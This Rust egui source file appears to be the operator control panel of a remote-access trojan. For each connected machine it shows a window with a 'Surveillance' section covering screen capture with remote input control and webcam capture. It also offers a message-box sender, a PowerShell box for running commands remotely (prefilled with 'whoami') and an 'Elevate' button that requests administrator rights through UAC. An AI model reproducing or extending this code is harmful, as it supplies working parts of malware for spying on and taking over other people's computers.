use core::f32;

use crate::{manager::types::UiManagerCommand, ui::client::types::*};
use egui::{
    Button, CollapsingHeader, Color32, Context, Frame, Id, Margin, RichText, ScrollArea, Stroke,
    TextEdit, TextStyle, Window,
};
use shared::commands::{
    CaptureQuality, CaptureType, Command, ComputerInfoResponse, MessageBoxArgs,
};
use tokio::sync::mpsc::UnboundedSender;

////////////////////
pub mod types;
mod video;
////////////////////

pub struct ClientViewState {
    pub visible: bool,
    pub powershell: PowerShellView,
    pub input: ClientViewInputState,
    pub captures: ClientViewCaptures,
    pub textures: ClientViewTextures,
    pub capturing: ClientViewCaptureState,
    pub msgbox: MsgboxView,
}
pub struct ClientView {
    pub mutex: String,
    pub elevated: bool, // do we have admin on the client
    pub state: ClientViewState,
    pub socket: String,
    pub info: ComputerInfoResponse,
    sender: UnboundedSender<UiManagerCommand>,
}
impl ClientView {
    pub fn new(
        socket: String,
        mutex: String,
        elevated: bool,
        info: ComputerInfoResponse,
        sender: UnboundedSender<UiManagerCommand>,
    ) -> Self {
        Self {
            mutex: mutex,
            elevated: elevated, // assume no
            socket: socket,
            state: ClientViewState {
                visible: false,
                input: ClientViewInputState {
                    active: false,
                    clicking: false,
                    last_update: None,
                    last_position: None,
                },
                powershell: PowerShellView {
                    input: String::from("whoami"),
                    output: String::from("\n"),
                },
                captures: ClientViewCaptures {
                    screen: ClientViewCapture {
                        max_scale: 1.5,
                        quality: CaptureQuality::Speed,
                        scale: 1.0,
                        data: None,
                    },
                    webcam: ClientViewCapture {
                        max_scale: 1.0,
                        quality: CaptureQuality::Speed,
                        scale: 0.35,
                        data: None,
                    },
                },
                textures: ClientViewTextures {
                    screen: None,
                    webcam: None,
                },
                capturing: ClientViewCaptureState::default(),
                msgbox: MsgboxView::default(),
            },
            // socket: socket,
            info: info,
            sender: sender,
        }
    }
}

pub fn render(ctx: &Context, view: &mut ClientView) {
    Window::new(view.info.hostname.clone())
        .id(Id::new(&view.mutex)) // rely on the mutex in case connected devices share a hostname (for whatever reason)
        .open(&mut view.state.visible)
        .resizable(true)
        .movable(!view.state.input.active) // don't move the window while we're giving verbal
        .show(ctx, |ui| {
            CollapsingHeader::new("🔍  Surveillance")
                .default_open(true)
                .show(ui, |ui| {
                    ui.horizontal(|ui| {

                        ui.vertical(|ui| {
                        CollapsingHeader::new("🖵  Screen")
                            .default_open(false)
                            .show(ui, |ui| {
                            ui.horizontal(|ui| {
                                ui.checkbox(&mut view.state.input.active, "Control");
                                if view.state.input.active { ui.label("  ⚠ Window position locked"); }
                            });
                            video::render(
                                ui,
                                CaptureType::Screen,
                                &view.mutex,
                                &view.sender,
                                &mut view.state.input,
                                &mut view.state.captures.screen,
                                &mut view.state.capturing.screen,
                                &mut view.state.textures.screen,
                            );
                            });
                        });


                        ui.vertical(|ui| {
                            CollapsingHeader::new("📸  Camera")
                            .default_open(false)
                            .show(ui, |ui| {
                            video::render(
                                ui,
                                CaptureType::Camera,
                                &view.mutex,
                                &view.sender,
                                &mut view.state.input,
                                &mut view.state.captures.webcam,
                                &mut view.state.capturing.webcam,
                                &mut view.state.textures.webcam,
                            );
                            });
                        });

                        });
                });
            CollapsingHeader::new("🗁  Utility")
                .default_open(true)
                .show(ui, |ui| {
                    CollapsingHeader::new("💬  MessageBox")
                        .default_open(false)
                        .show(ui, |ui| {
                            ui.text_edit_singleline(&mut view.state.msgbox.title);
                            ui.text_edit_multiline(&mut view.state.msgbox.text);

                            if ui.button("Send").clicked() {
                                let _ = view.sender.send(UiManagerCommand::SendCommand(
                                    view.mutex.clone(),
                                    Command::MessageBox(MessageBoxArgs {
                                        title: view.state.msgbox.title.clone(),
                                        text: view.state.msgbox.text.clone(),
                                    }),
                                ));
                            }
                        });


                    let theme = egui_extras::syntax_highlighting::CodeTheme::from_memory(ui.ctx(), ui.style());
                    let mut layouter = |ui: &egui::Ui, buf: &dyn egui::TextBuffer, wrap_width: f32| {
                        let mut layout_job = egui_extras::syntax_highlighting::highlight(
                            ui.ctx(),
                            ui.style(),
                            &theme,
                            buf.as_str(),
                            "ps1", // syntect doesnt have built in support for ps1
                        );
                        layout_job.wrap.max_width = wrap_width;
                        ui.fonts(|f| f.layout_job(layout_job))
                    };
                    CollapsingHeader::new("🗖  PowerShell").default_open(false)
                    .show(ui, |ui| {
                        ui.label("Input");
                        ScrollArea::vertical().show(ui, |ui| {
                            ui.add(TextEdit::multiline(&mut view.state.powershell.input)
                        .font(TextStyle::Monospace)
                        .code_editor()
                        .desired_rows(4)
                        .lock_focus(true)
                        .desired_width(f32::INFINITY)
                        .layouter(&mut layouter))
                        });
                        ui.label("Output");
                        egui::Frame::new().fill(ui.visuals().faint_bg_color)
                        .corner_radius(8.0)
                        .inner_margin(2.0)
                        .show(ui, |ui| {
                            ui.set_width(ui.available_width());
                            ScrollArea::vertical().show(ui, |ui| {
                                ui.label(
                                    RichText::new(&view.state.powershell.output)
                                        .monospace()
                                        .size(10.0)
                                        .color(ui.visuals().text_color())
                                        .text_style(TextStyle::Monospace),
                                )
                            });
                        });
                        if ui.button("Send").clicked() {
                            let _ = view.sender.send(UiManagerCommand::SendCommand(view.mutex.clone(), Command::PowerShell(view.state.powershell.input.clone())));
                        };
                    });
                    CollapsingHeader::new("🛡  Elevate")
                        .default_open(false)
                        .show(ui, |ui| {
                            if !view.elevated {
                                ui.label("If UAC is enabled on the client, clicking this button will prompt the user, and requires administrative privileges.");
                            } else {
                                ui.label("✔ Already elevated");
                            }
                            if ui.add_enabled(!view.elevated, Button::new("Send")).clicked() {
                                let _ = view.sender.send(UiManagerCommand::SendCommand(view.mutex.clone(), Command::Elevate));
                            };
                        });

                });

            let disconnect = eframe::egui::Button::new("✖  Disconnect")
                .fill(Color32::DARK_RED)
                .stroke(Stroke::new(1.0, Color32::BLACK));
            Frame::new().inner_margin(Margin::same(4)).show(ui, |ui| {
                if ui.add(disconnect).clicked() {
                    let _ = view
                        .sender
                        .send(UiManagerCommand::Disconnect(view.mutex.clone()));
                }
            })
        });
}
